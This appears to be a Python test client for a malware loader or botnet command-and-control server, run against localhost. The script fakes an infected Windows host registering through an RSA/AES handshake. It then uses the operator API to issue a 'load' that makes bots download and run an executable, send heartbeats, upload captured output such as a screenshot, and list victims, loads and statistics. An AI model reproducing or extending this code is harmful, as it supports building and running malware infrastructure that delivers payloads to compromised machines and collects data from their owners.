import requests
import json
from cryptography.hazmat.primitives import padding
from chepy import Chepy as c
from colorama import Fore
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import hashlib
import time
import rsa

SERVER_ADDRESS = "http://127.0.0.1:9999"
API_SECRET = "debug"

def encrypt_data_withkey(plaintext, key):
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext.encode('utf-8')) + padder.finalize()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    base64_encoded_ciphertext = base64.b64encode(ciphertext).decode('utf-8')
    return base64_encoded_ciphertext

def decrypt_data_withkey(base64_encoded_ciphertext, key):
    base64_decoded_ciphertext = base64.b64decode(base64_encoded_ciphertext)
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_ciphertext = decryptor.update(base64_decoded_ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(decrypted_ciphertext) + unpadder.finalize()
    return plaintext

print("[?] Register Client")

client_bytes = secrets.token_bytes(32)
#with open('/home/admin/Documents/rust/Blight/public.pem', mode='rb') as f:
#    keydata = f.read()

keydata = b'''
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
-----END RSA PUBLIC KEY-----
'''

encrypted_message = encrypt_data_withkey(
    json.dumps({
        "version": 10,
        "uac": False,
        "username": secrets.token_hex(8),
        "guid": 'windows-guid',
        "cpu": "Intel i5-100k",
        "gpu": "RTX 3050",
        "ram": 16,
        "antivirus": "Windows Defender",
        "path": "C:\\Windows\\System32\\malware.exe",
        "pid": 5102,
        "client_bytes": base64.encodebytes(client_bytes).decode("utf-8"),
    }),
    client_bytes
) + "|" + base64.b64encode(rsa.encrypt(client_bytes, rsa.PublicKey.load_pkcs1(keydata))).decode("utf-8")


register_client = requests.post(
    SERVER_ADDRESS + "/gateway", 
    encrypted_message
)

decrypted_response = json.loads(
    decrypt_data_withkey(register_client.text, client_bytes).decode("utf-8")
)
server_bytes = base64.decodebytes(
    decrypted_response["server_bytes"].encode()
)

new_encryption_key = hashlib.sha256(client_bytes + server_bytes).hexdigest()[:32].encode()
client_id = decrypted_response["client_id"]

print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Issue Load")
issue_load = requests.post(
    SERVER_ADDRESS + "/api/issue",
    json.dumps({
        "api_secret": API_SECRET,
        "recursive": True,
        "cmd_type": "disk",
        "required_amount": 10,
        "cmd_args": "https://127.0.0.1:9999/files/recursive_test2.exe"
    }),
)

print(f"{issue_load.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Heartbeat Client")
heartbeat_response = requests.post(
    SERVER_ADDRESS + "/gateway", 
    client_id + encrypt_data_withkey(json.dumps({
        "action": "heartbeat",
    }), new_encryption_key)
)

decrypted_response = decrypt_data_withkey(heartbeat_response.text, new_encryption_key).decode("utf-8")
print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

if decrypted_response != "Ok":

    img = None
    with open("image.png", 'rb') as f:
        img = f.read()

    print("[?] Submit Output")
    submit_output = requests.post(
        SERVER_ADDRESS + "/gateway", 
        client_id + encrypt_data_withkey(json.dumps({
            "action": "submit_output",
            "client_id": client_id,
            "command_id": json.loads(decrypted_response)["command_id"],
            "output": base64.b64encode(img).decode("utf-8")
        }), new_encryption_key)
    )
    print(submit_output.text)
    decrypted_response = decrypt_data_withkey(submit_output.text, new_encryption_key).decode("utf-8")
    print(f"{decrypted_response}\n{'_'*50}")

# //-------------------------------------- Server Endpoints --------------------------------------\\


print("[?] Get output list for specific client")
get_client_outputs = requests.post(
    SERVER_ADDRESS + "/api/get_output",
    json.dumps({
        "api_secret": API_SECRET,
        "client_id": client_id,
    }),
)
print(f"{get_client_outputs.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")


'''
print("[?] Blocking Client")
client_heartbeat = requests.post(
    SERVER_ADDRESS + "/gateway", 
    ready_data({
        "action": "block",
        "api_secret": API_SECRET,
    }),

)
'''

print("[?] Get clients list")
get_clients_list = requests.post(
    SERVER_ADDRESS + "/api/clients_list",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(f"{get_clients_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

'''
print("[?] Delete load")
delete_load = requests.post(
    SERVER_ADDRESS + "/api/remove_load",
    json.dumps({
        "api_secret": API_SECRET,
        "load_id": issue_load.text,
    }),
)

print(f"{delete_load.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
'''
print("[?] Get loads list")
get_loads_List = requests.post(
    SERVER_ADDRESS + "/api/loads_list",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(f"{get_loads_List.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print("[?] Get Statistics")
get_statistics = requests.post(
    SERVER_ADDRESS + "/api/statistics",
    json.dumps({
        "api_secret": API_SECRET,
    }),
)

print(f"{get_statistics.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")

print(f"{Fore.GREEN}[+] All done! Every request was sent without fail. Your endpoint has no flaws.")